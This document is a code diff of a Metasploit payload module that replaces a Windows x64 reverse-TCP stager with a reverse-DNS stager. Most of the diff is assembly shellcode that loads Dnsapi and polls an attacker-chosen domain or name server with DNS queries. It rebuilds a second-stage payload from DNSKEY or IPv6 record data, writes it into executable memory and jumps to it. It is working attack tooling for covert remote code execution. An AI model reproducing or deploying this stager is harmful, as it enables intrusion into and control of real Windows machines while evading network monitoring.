@@ -2,7 +2,6 @@
 
 require 'msf/core'
 require 'msf/core/payload/transport_config'
-require 'msf/core/payload/windows/x64/send_uuid'
 require 'msf/core/payload/windows/x64/block_api'
 require 'msf/core/payload/windows/x64/exitfunk'
 
@@ -10,7 +9,7 @@ module Msf
 
 ###
 #
-# Complex reverse_tcp payload generation for Windows ARCH_x64
+# Complex reverse_dns payload generation for Windows ARCH_X64
 #
 ###
 
@@ -18,7 +17,6 @@ module Payload::Windows::ReverseDns_x64
 
   include Msf::Payload::TransportConfig
   include Msf::Payload::Windows
-  include Msf::Payload::Windows::SendUUID_x64
   include Msf::Payload::Windows::BlockApi_x64
   include Msf::Payload::Windows::Exitfunk_x64
 
@@ -28,11 +26,11 @@ module Payload::Windows::ReverseDns_x64
   def generate(opts={})
     ds = opts[:datastore] || datastore
     conf = {
-      ns_server:   ds['NS_SERVER'],
-      client_id:   '0',
-      server_id:   ds['SERVER_ID'],
+      ns_server:   ds['NS_IP'],
       domain:      ds['DOMAIN'],
+      server_id:   ds['SERVER_ID'],
       retry_count: ds['ReverseConnectRetries'],
+      req_type:    ds['REQ_TYPE'] || "DNSKEY",
       reliable:    false
     }
 
@@ -42,35 +40,31 @@ module Payload::Windows::ReverseDns_x64
       conf[:reliable] = true
     end
 
-    generate_reverse_tcp(conf)
+    generate_reverse_dns(conf)
   end
 
-  #
-  # By default, we don't want to send the UUID, but we'll send
-  # for certain payloads if requested.
-  #
-  def include_send_uuid
-    false
-  end
 
   def transport_config(opts={})
-    transport_config_reverse_tcp(opts)
+    transport_config_reverse_dns(opts)
   end
 
   #
   # Generate and compile the stager
   #
-  def generate_reverse_tcp(opts={})
+  def generate_reverse_dns(opts={})
     combined_asm = %Q^
       cld                    ; Clear the direction flag.
+      and rsp, ~0xF          ;  Ensure RSP is 16 byte aligned
       call start             ; Call start, this pushes the address of 'api_call' onto the stack.
       #{asm_block_api}
+      #{asm_functions_dns()}
+      
       start:
-        pop ebp
-      #{asm_reverse_tcp(opts)}
-      #{asm_block_recv(opts)}
+        pop rbp     
+      #{asm_reverse_dns(opts)}
+      
     ^
-    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
+    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
 
   #
@@ -86,8 +80,7 @@ module Payload::Windows::ReverseDns_x64
     # Reliability adds some bytes!
     space += 44
 
-    space += uuid_required_size if include_send_uuid
-
+    # The final estimated size
     # The final estimated size
     space
   end
@@ -95,188 +88,404 @@ module Payload::Windows::ReverseDns_x64
   #
   # Generate an assembly stub with the configured feature set and options.
   #
-  # @option opts [Integer] :port The port to connect to
-  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
+  # @option opts [String]  :domain DOMAIN that wll be used for tunnel
+  # @option opts [String]  :ns_server Optional: NS server, that will be used.
   # @option opts [Integer] :retry_count Number of retry attempts
   #
-  def asm_reverse_tcp(opts={})
+  def asm_reverse_dns(opts={})
 
-    retry_count  = [opts[:retry_count].to_i, 1].max
-    encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
-    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
-
-    asm = %Q^
-      ; Input: EBP must be the address of 'api_call'.
-      ; Output: EDI will be the socket for the connection to the server
-      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
-
-      reverse_tcp:
-        push '32'               ; Push the bytes 'ws2_32',0,0 onto the stack.
-        push 'ws2_'             ; ...
-        push esp                ; Push a pointer to the "ws2_32" string on the stack.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
-        call ebp                ; LoadLibraryA( "ws2_32" )
-
-        mov eax, 0x0190         ; EAX = sizeof( struct WSAData )
-        sub esp, eax            ; alloc some space for the WSAData structure
-        push esp                ; push a pointer to this stuct
-        push eax                ; push the wVersionRequested parameter
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSAStartup')}
-        call ebp                ; WSAStartup( 0x0190, &WSAData );
-
-      set_address:
-        push #{retry_count}     ; retry counter
-
-      create_socket:
-        push #{encoded_host}    ; host in little-endian format
-        push #{encoded_port}    ; family AF_INET and port number
-        mov esi, esp            ; save pointer to sockaddr struct
-
-        push eax                ; if we succeed, eax will be zero, push zero for the flags param.
-        push eax                ; push null for reserved parameter
-        push eax                ; we do not specify a WSAPROTOCOL_INFO structure
-        push eax                ; we do not specify a protocol
-        inc eax                 ;
-        push eax                ; push SOCK_STREAM
-        inc eax                 ;
-        push eax                ; push AF_INET
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
-        call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
-        xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
-
-      try_connect:
-        push 16                 ; length of the sockaddr struct
-        push esi                ; pointer to the sockaddr struct
-        push edi                ; the socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'connect')}
-        call ebp                ; connect( s, &sockaddr, 16 );
-
-        test eax,eax            ; non-zero means a failure
-        jz connected
-
-      handle_connect_failure:
-        ; decrement our attempt count and try again
-        dec dword [esi+8]
-        jnz try_connect
-    ^
-
-    if opts[:exitfunk]
-      asm << %Q^
-      failure:
-        call exitfunk
-      ^
-    else
-      asm << %Q^
-      failure:
-        push 0x56A2B5F0         ; hardcoded to exitprocess for size
-        call ebp
-      ^
-    end
-
-    asm << %Q^
-      ; this  lable is required so that reconnect attempts include
-      ; the UUID stuff if required.
-      connected:
-    ^
-
-    asm << asm_send_uuid if include_send_uuid
-
-    asm
-  end
-
-  #
-  # Generate an assembly stub with the configured feature set and options.
-  #
-  # @option opts [Bool] :reliable Whether or not to enable error handling code
-  #
-  def asm_block_recv(opts={})
+    retry_count  = [opts[:retry_count].to_i, 1000].max
+    domain       = "#{opts[:server_id]}.#{opts[:domain]}" 
+    req_type     = opts[:req_type]     
+    ns_server    = "0x%.8x" % Rex::Socket.addr_aton(opts[:ns_server]||"0.0.0.0").unpack("V").first
+    domain_length= domain.length + 18
+    
+    alloc_stack  = (domain_length) + (8 - (domain_length % 8))
     reliable     = opts[:reliable]
+    
+    dns_options  = 0x248
+    request_type = 0x1c
+    
+    if req_type == "DNSKEY"
+      dns_options  |= 2
+      request_type =  0x30
+    end
+    
+    #
+    # Shellcode is not optimize to best size, BETA!
+    # //TODO optimie shellcode!
     asm = %Q^
-      recv:
-        ; Receive the size of the incoming second stage...
-        push 0                  ; flags
-        push 4                  ; length = sizeof( DWORD );
-        push esi                ; the 4 byte buffer on the stack to hold the second stage length
-        push edi                ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
-        call ebp                ; recv( s, &dwLength, 4, 0 );
-    ^
+         ; Input: RBP must be the address of 'api_call'.
+         
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+         xor rbx, rbx                   ; stack alignment
+         push rbx
+         ;;;;;;;;; Load DNS API lib ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 
+         mov         r14, 'Dnsapi'      ; Push the bytes 'Dnsapi',0,0 onto the stack.
+         push        r14
+         mov         rcx, rsp 
+         mov         r10, #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+         call        rbp                ; LoadLibraryA( "Dnsapi" )
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
+         call         get_eip
+        
+      get_eip:
+         pop           rax
+         jmp           start_code
+      
+      hostname:
+         db "7812.000g.0000.0.#{domain}", 0x00
+        
+        ;;;;;;;;;;; INCREMENT DOMAIN
+      increment:
+         push        rbp
+         mov         rbp, rsp
+         add         rbp, 0x10
 
-    if reliable
+         mov         rax, [rbp+8]      ; DOMAIN
+         add         rax, [rbp]        ; offset
+
+         ; domain inc proc
+         mov         eax, dword ptr[rax]
+         mov         ebx, eax
+         shl         eax, 16
+         shr         eax, 16
+         shr         ebx, 16
+         inc         bh
+         cmp         bh, 0x3a
+         jnz         increment_done
+         mov         bh, 0x30
+         inc         bl
+         cmp         bl, 0x3a
+         jnz         increment_done
+         mov         bl, 0x30
+         inc         ah
+         cmp         ah, 0x3a
+         jnz         increment_done
+         mov         ah, 0x30
+         inc         al
+
+      increment_done:
+         shl         ebx, 16
+         or          eax, ebx
+         mov         r12, [rbp + 8]
+         add         r12, [rbp]
+         mov         dword ptr[r12], eax
+         pop         rbp
+         ret         0x10   
+            
+        ;;;;;;;;;;; CALL DNS    
+      call_dns:
+         push        rbp
+         mov         r15, rbp
+         mov         rbp, rsp
+         add         rbp, 0x10
+         push        20
+         push        -1
+
+      dns_loop:
+         mov         rax, [rsp + 8]
+         test        rax, rax
+         je          dns_loop_end              ; out of tries 8(
+         mov         rax, [rsp]
+         test        rax, rax
+         je          dns_loop_end              ; done, got result
+         push        0
+         mov         rax, [rbp + 0x8]            ;  result
+         push        rax
+         mov         r9, [rbp + 0x10]            ;  NS IP
+         mov         r8d, #{dns_options}
+         mov         dx,  #{request_type}
+         mov         rcx, [rbp]                ;  domain
+         mov         r10, #{Rex::Text.block_api_hash('Dnsapi.dll', 'DnsQuery_A')}
+         call        r15
+         add         rsp, 0x30
+         mov         [rsp], rax
+         mov         rax, [rsp + 8]
+         dec         rax
+         mov         [rsp + 8], rax
+         jmp         dns_loop
+      dns_loop_end:
+         pop         rax
+         pop         rbp
+         pop         rbp
+         ret
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;          
+            
+      start_code:
+        ;;;;;;;;; INIT VARS in stack
+      
+         sub         rsp, #{alloc_stack}
+         mov         rcx, #{domain_length}
+         mov         rdi, rsp
+         mov         rsi, rax
+         add         rsi, 6
+         rep         movsb               ; copy domain to the stack
+         xor         rax, rax
+         push        rax                 ; pointer to RWX memory (for stage1)
+         push        rax                 ; size of stage1
+         push        rax                 ; offset
+         push        rax                 ; * pointer to DNS_RECORD(as result)
+         push        rax
+         push        rax                 ; * IP4_ARRAY[1]
+         push        #{retry_count}      ; * tries counter
+         
+         ;;;;;;;;; main proc
+
+         mov         rbx, #{ns_server}     ; NS IP
+         mov         rax, rsp
+         add         rax, 16
+         test        rbx, rbx
+         je          no_ns_server
+         
+         ; IP4_ARRAY
+         mov         [rax], 1;
+         mov         [rax + 4], ebx
+         
+      no_ns_server:
+         push        rax                 ; NS IP4_ARRAY pointer
+         add         rax, 0x08
+         push        rax                 ; DNS_RECORD pointer
+         add         rax, 0x20
+         push        rax                 ; DOMAIN pointer
+         
+      get_header:
+         dec         [rsp + 0x18]        ; load tries number
+         mov         rax, [rsp + 0x18]   ; decrement
+         test        rax, rax
+         je          exit_func
+         mov         rax, rsp
+         add         rax, 0x50
+         push        rax
+         push        10 
+         call        increment
+         call        call_dns
+         test        eax, eax
+         jne         parse_end_br        
+         mov         rax, [rsp + 0x30]         
+         push        rax
+         mov         rsi, rsp              ; pointer to DNS_RECORD
+         mov         [rsi], rax            ; ESI < -pointer to DNS_RECORD
+         mov         rbx, [rsi]            ; EBX < -current pointer
+         mov         rdx, [rbx]
+         mov         [rsi], rdx            ; save Next IP
+         mov         rdx, rbx
+         ^
+         
+    if req_type == "IPv6" # IPv6 
+         
+      asm << %Q^    
+         add         rdx, 0x20                ; EDX < -IP pointer
+         movzx       ecx, byte ptr[rdx + 1]   ; header byte 1
+         cmp         cl, 0x81                 ; If this is header flag
+         jne         parse_end_b
+         movzx       ecx, byte ptr[rdx]
+         cmp         cl, 0xfe            ; check if fe have data flag in this header
+         jne         parse_end_b
+        
+      get_size:
+         movzx       eax, byte ptr[rdx + 0x0a]
+         test        eax, eax
+         je          parse_end_b
+         cmp         eax, 1
+         jne         parse_end_b
+         pop         rax
+         mov         eax, [rdx + 0xb]      ; SIZE of stage 1
+         mov         [rsp + 0x40], rax
+         jmp         parse_end
+       ^
+    else  # DNSKKEY
       asm << %Q^
-        ; reliability: check to see if the recv worked, and reconnect
-        ; if it fails
-        cmp eax, 0
-        jle cleanup_socket
+      
+         add        rdx,0x28
+         movzx      ecx,byte ptr ds:[rdx]          ; check status
+         test       ecx,ecx                        ; If this is header flag         
+         jne        parse_end_b
+         
+       get_size:
+         pop        rax
+         mov        eax,  dword ptr ds:[rdx + 0x7]     ; get size
+         mov        [rsp + 0x40], eax
+         jmp        parse_end
+      
       ^
+    
     end
-
+    
     asm << %Q^
-        ; Alloc a RWX buffer for the second stage
-        mov esi, [esi]          ; dereference the pointer to the second stage length
-        push 0x40               ; PAGE_EXECUTE_READWRITE
-        push 0x1000             ; MEM_COMMIT
-        push esi                ; push the newly recieved second stage length.
-        push 0                  ; NULL as we dont care where the allocation is.
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
-        call ebp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
-        ; Receive the second stage and execute it...
-        xchg ebx, eax           ; ebx = our new memory address for the new stage
-        push ebx                ; push the address of the new stage so we can return into it
+      parse_end_br:
+         xor         rax, rax
+         jmp         parse_end
+      parse_end_b:
+         pop         rax
+         xor         rax, rax
+      parse_end:
+         test       rax, rax
+         je         get_header
+         
+         
+         mov         rax, rsp
+         mov         byte ptr[rax + 0x58], '0'          ; switch to data mode
 
-      read_more:
-        push 0                  ; flags
-        push esi                ; length
-        push ebx                ; the current address into our second stage's RWX buffer
-        push edi                ; the saved socket
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'recv')}
-        call ebp                ; recv( s, buffer, length, 0 );
-    ^
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;     RESET COUNTER
+         mov         qword ptr[rsp + 0x18], 50
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;     GET MEM 
+         mov         rsi, [rsp + 0x40]           ; get size, that  we just recieved
+         push        0x40                        ; 
+         pop         r9                          ; PAGE_EXECUTE_READWRITE
+         push        0x1000                      ; 
+         pop         r8                          ; MEM_COMMIT
+         mov         rdx, rsi                    ; the newly recieved second stage length.
+         xor         rcx, rcx                    ; NULL as we dont care where the allocation is.
+         mov         r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+         call        rbp                         ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, 
+         add         rsp, 0x20
+         mov         [rsp + 0x48], rax           ; save pointer to RWX mem
+         jmp         get_data
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
-    if reliable
-      asm << %Q^
-        ; reliability: check to see if the recv worked, and reconnect
-        ; if it fails
-        cmp eax, 0
-        jge read_successful
 
-        ; something failed, free up memory
-        pop eax                 ; get the address of the payload
-        push 0x4000             ; dwFreeType (MEM_DECOMMIT)
-        push 0                  ; dwSize
-        push eax                ; lpAddress
-        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
-        call ebp                ; VirtualFree(payload, 0, MEM_DECOMMIT)
+         ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;  GETTING DATA LOOP
+      get_data_next_try:
+         dec         [rsp + 0x18]                ; retry_counter decrement
+         mov         rax, [rsp + 0x18]
+         test        eax, eax                    ; if retry_counter is 0, we done... sorry ggwp
+         je          exit_func
 
-      cleanup_socket:
-        ; clear up the socket
-        push edi                ; socket handle
-        push #{Rex::Text.block_api_hash('ws2_32.dll', 'closesocket')}
-        call ebp                ; closesocket(socket)
-
-        ; restore the stack back to the connection retry count
-        pop esi
-        pop esi
-        dec [esp]               ; decrement the counter
-
-        ; try again
-        jmp create_socket
+      get_data:
+         call        call_dns
+         test        eax, eax
+         jne         parse_end_db2
+         
+         mov         rax, [rsp + 0x30]         
+         push        rax
+         mov         rax, [rsp + 0x40]
+         push rax
       ^
+      
+    if req_type == "IPv6"     #IPv6
+      asm << %Q^     
+      
+      ip_enum:
+         mov         rax, [rsp+8]            
+         test        rax, rax
+         je          copy_end
+         mov         rbx, [rax]          ; RBX <-current pointer
+         mov         [rsp + 8], rbx      ; save Next IP
+         mov         rdx, rax
+         add         rdx, 0x20           ; RDX <-IP pointer
+         xor         rax, rax
+
+         movzx       ecx, byte ptr[rdx + 1]      ; header byte 1, size for IP
+         mov         al, cl
+         and         cl, 0x0f                    ; apply MASK to get size of data in that IP
+         cmp         cl, 0x0e                    ; amount of bytes in that IP, should be 14 or less
+         ja          parse_end_db
+      
+         movzx       ebx, byte ptr[rdx]
+         cmp         bl, 0xfe                    ; if FE, than index offset is 16
+         je          index_16
+         cmp         bl, 0xff                    ; if FF, than index offset in AL reg
+         je          index_al
+         jmp         parse_end_db                ; else - something wrong!
+       
+      index_16:
+         mov         al, 16
+         imul        rax, 0x0e
+         jmp         copy_ip_as_data
+       
+      index_al:   
+         shr         al, 4
+         imul        rax, 0x0e
+         
+      copy_ip_as_data:
+         mov         rsi, rdx                ; src - IP addr
+         add         rsi, 2
+         mov         rbx, [rsp]
+         mov         rdi, [rsp + 0x58]
+         add         rdi, rbx                ; dst - RWX mem
+         add         rdi, rax
+         add         [rsp+0x48], rcx
+         mov         rax, rcx
+         cld
+         rep         movsb                  ; copy
+         sub         [rsp + 0x50], rax      
+         jmp         ip_enum
+      ^
+    else #DNSKEY
+      asm << %Q^ 
+        mov         rax, [rsp + 8]                  ; RAX <-current pointer          
+        test        rax, rax
+        je          copy_end       
+        mov         ecx, dword ptr ds:[rax + 0x24]  ; RCX <- current size
+        test        ecx, ecx 
+        je          parse_end_db
+        sub         rcx, 3
+        add         [rsp + 0x48], rcx
+        sub         [rsp + 0x50], rcx
+        mov         rsi, rax
+        add         rsi, 0x2B                    ; RSI <-  source
+        mov         rbx, [rsp]
+        mov         rdi, [rsp + 0x58]
+        add         rdi, rbx                     ; dst - RWX mem
+        cld
+        rep         movsb                        ; copy  
+      ^      
     end
+    
+    asm << %Q^    
+      copy_end:
+         add         rsp, 0x10
+         mov         rax, [rsp + 0x40]
+         test        rax, rax
+         je          got_everything
 
-    asm << %Q^
-      read_successful:
-        add ebx, eax            ; buffer += bytes_received
-        sub esi, eax            ; length -= bytes_received, will set flags
-        jnz read_more           ; continue if we have more to read
-        ret                     ; return into the second stage
+         mov         rax, rsp
+         add         rax, 0x50
+         push        rax
+         push        5
+         call        increment
+         jmp         get_data
+         
+      parse_end_db:
+         add         rsp, 0x10 
+      parse_end_db2:         
+         mov         rax, rsp
+         add         rax, 0x50
+         push        rax
+         push        10
+         call        increment
+         jmp         get_data_next_try
+         
+      got_everything:
+      ;;;;;;;;;;;;;;;;;;;;;;;;;
+         mov             rax, [rsp + 0x48]
+         add             rax, 4
+         jmp             rax
+      ;;;;;;;;;;;;;;;;;;;;;;;;;
+      
+      exit_func:
     ^
-
+    
     if opts[:exitfunk]
       asm << asm_exitfunk(opts)
     end
 
     asm
+  end
+  
+  
+  def asm_functions_dns()
+  
+    asm = %Q^
+     nop
+    ^
+    
+    asm
+  end
+
+  def stage_over_connection?
+    false
   end
 
 end
